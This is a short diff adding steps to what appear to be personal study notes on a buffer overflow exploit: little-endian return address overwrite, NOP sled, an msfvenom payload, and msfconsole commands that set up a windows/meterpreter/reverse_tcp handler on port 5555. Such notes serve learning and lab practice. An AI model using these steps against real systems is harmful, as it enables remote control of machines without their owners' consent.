@@ -871,5 +871,20 @@ s.close ## Close the socket
 - log data
 - results torwards bottom
 
+- Take that address, turn to little endian and replace with the 3rd varibles previous value
+- add the nop sled
+- generate you msfvenom payload
+- add these to your scripts
+
+- open msfconsole
+```use multi/handler```
+```show options```
+```set payload windows/meterpreter/reverse_tcp```
+```set lhost 0.0.0.0```
+```set lport 5555```
+```exploit```
+
+
+
 
     
